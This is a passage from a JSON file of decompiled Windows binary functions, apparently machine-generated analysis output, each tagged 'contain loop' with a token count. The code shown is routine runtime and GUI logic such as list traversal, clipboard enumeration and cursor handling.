        "decompiled_code": "\nuint fcn.0040cb20(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040ea38": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040ea38(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040ea6c();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040ea6c();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 124
    },
    "0040ea6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040ea6c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040aa40();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040e528(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.0040aa40();\n    }\n    return iVar2;\n}\n",
        "token_count": 92
    },
    "0040f320": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040f320(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x491a20; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 97
    },
    "0040f5a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f5a4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    uVar1 = fcn.0040f588();\n    iVar2 = sub.kernel32.dll_GetCurrentThreadId_1();\n    for (puVar3 = *(in_EAX + 4 + (uVar1 & 0xff) * 4); (puVar3 != NULL && (iVar2 != puVar3[1])); puVar3 = *puVar3) {\n    }\n    if (puVar3 == NULL) {\n        puVar3 = fcn.0040f62c();\n        if (puVar3 == NULL) {\n            puVar3 = fcn.00402ee8();\n            puVar3[1] = iVar2;\n            puVar3[2] = 0x7fffffff;\n            *puVar3 = puVar3;\n            uVar4 = fcn.0040f520();\n            *puVar3 = uVar4;\n        }\n    }\n    *param_2 = puVar3;\n    return;\n}\n",
        "token_count": 269
    },
    "0040f62c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * fcn.0040f62c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar2 = fcn.0040f588();\n    puVar1 = *(in_EAX + 4 + (uVar2 & 0xff) * 4);\n    while( true ) {\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n        iVar3 = fcn.0040f520();\n        if (iVar3 != 0x7fffffff) break;\n        puVar1 = *puVar1;\n    }\n    uVar4 = sub.kernel32.dll_GetCurrentThreadId_1();\n    puVar1[1] = uVar4;\n    return puVar1;\n}\n",
        "token_count": 184
    },
    "00411038": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411038(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x41127d;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00411038::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x41110e;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x41111d;\n            fcn.0040dafc();\n            var_1ch = 0x411122;\n            fcn.00404ec4();\n            goto code_r0x00411255;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x4110cc;\n                var_10h = &stack0xfffffffc;\n                fcn.00410e04();\n                goto code_r0x00411255;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x411180;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x41118f;\n                fcn.0040dafc();\n                var_1ch = 0x411194;\n                fcn.00404ec4();\n                goto code_r0x00411255;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x4111ef;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x4111fe;\n                fcn.0040dafc();\n                var_1ch = 0x411203;\n                fcn.00404ec4();\n                goto code_r0x00411255;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x4110de;\n                var_10h = &stack0xfffffffc;\n                fcn.00407550();\n                var_1ch = 0x4110ed;\n                fcn.0040dafc();\n                var_1ch = 0x4110f2;\n                fcn.00404ec4();\n                goto code_r0x00411255;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x4110fc;\n                var_10h = &stack0xfffffffc;\n                fcn.00410ef4();\n                goto code_r0x00411255;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x411134;\n            fcn.00407550();\n            var_1ch = 0x411143;\n            fcn.0040dafc();\n            var_1ch = 0x411148;\n            fcn.00404ec4();\n            goto code_r0x00411255;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x41115a;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x411169;\n            fcn.0040dafc();\n            var_1ch = 0x41116e;\n            fcn.00404ec4();\n            goto code_r0x00411255;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x4111a6;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111b5;\n            fcn.0040dafc();\n            var_1ch = 0x4111ba;\n            fcn.00404ec4();\n            goto code_r0x00411255;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x4111cc;\n            var_10h = &stack0xfffffffc;\n            fcn.00407550();\n            var_1ch = 0x4111db;\n            fcn.0040dafc();\n            var_1ch = 0x4111e0;\n            fcn.00404ec4();\n            goto code_r0x00411255;\n        }\n    }\n    var_38h = **0x494c7c;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x411224;\n    var_10h = &stack0xfffffffc;\n    fcn.0040d2e8();\n    var_1ch = &fcn.00411038::var_38h;\n    var_20h = 2;\n    var_24h = 0x411241;\n    fcn.00407550();\n    var_24h = 0x411250;\n    fcn.0040db38(var_20h, var_1ch);\n    var_24h = 0x411255;\n    fcn.00404ec4();\ncode_r0x00411255:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x411284;\n    var_1ch = 0x41126f;\n    fcn.00405554();\n    var_1ch = 0x41127c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1544
    },
    "004164f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004164f4(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 322
    },
    "004165a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004165a4(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "004186d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004186d4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419898();\n            cVar1 = fcn.00404544();\n            if (cVar1 != '\\0') goto code_r0x00418733;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x00418733:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 264
    },
    "0041873c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.0041873c(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419898();\n            cVar1 = fcn.0040487c();\n            if (cVar1 != '\\0') goto code_r0x00418776;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418776:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "00418930": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418930(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.00419898();\n                uVar1 = fcn.0041873c();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00418a50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418a50(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419898();\n            uVar2 = fcn.004185c8(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 143
    },
    "00418c58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00418c58(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419898();\n            cVar1 = fcn.00418840();\n            if (cVar1 != '\\0') goto code_r0x00418c90;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00418c90:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "00418c9c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418c9c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419898();\n            iVar1 = fcn.004198f4();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00418638();\n    fcn.00419740();\n    return;\n}\n",
        "token_count": 144
    },
    "00419018": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419018(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x419028;\n    fcn.00418c34();\n    uStack16 = 0x41907d;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.00418c58();\n        if (cVar1 != '\\0') break;\n        fcn.00418c40();\n        if (in_EAX == *0x417520) break;\n        in_EAX = fcn.004045dc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x419084;\n    uStack16 = 0x41907c;\n    fcn.00418cec();\n    return;\n}\n",
        "token_count": 231
    },
    "00419524": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00419524(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00407688();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00419898();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004198f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004198f4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0041cf48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041cf48(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00419898();\n                fcn.00404650();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00404650();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0041d280": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d280(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040676c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419740();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00420278": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420278(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00419898();\n                fcn.00420278();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "004209f8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004209f8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419898(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "00420a74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420a74(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419898();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.0041978c();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00420fe8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420fe8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x420ff8;\n    iVar1 = fcn.00419c08();\n    uStack24 = 0x42103d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419898();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x421044;\n    uStack24 = 0x42103c;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 227
    },
    "0042d540": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042d540(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419898();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "004319c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004319c4(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x4319d4;\n    (**(**(arg_8h + -4) + 0x18))();\n    uStack20 = 0x431a33;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack28 = 0;\n    puStack16 = &fcn.004319c4::var_1h + 1;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while ((uVar2 != 0 && (cVar1 = fcn.00427500(),  cVar1 == '\\0'))) {\n        uStack28 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x431a3a;\n    uStack24 = 0x431a32;\n    (**(**(arg_8h + -4) + 0x14))();\n    return;\n}\n",
        "token_count": 320
    },
    "004349f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004349f4(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004365a0();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.004365b0();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.00433a94();\n                }\n            }\n            else {\n                iVar2 = fcn.004365b0();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.004365b0();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00436668": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436668(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004365a0();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004365b0();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00436acc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00436acc(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.004365a0();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.004365b0();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00436b60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00436b60(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "00437dec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437dec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00439170": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439170(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.00419898();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.00419898();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "0043b9e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043b9e4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402f1c();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0043f5f4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043f5f4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.004585f8(2);\n    iVar2 = (***0x494a20)(uVar1);\n    iVar3 = fcn.00443dd4();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443dc0();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443dc0();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00444cac();\n    iVar3 = fcn.00443dd4();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.00443dc0();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.00443dc0();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "00441078": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441078(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004047dc();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.004585f8();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00443f70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443f70(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.00402f1c();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00444c74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00444c74(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419898();\n            fcn.00404650();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x499c20 + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 124
    },
    "00444cd0": {
        "rules": [
            "contain loop"
        ],
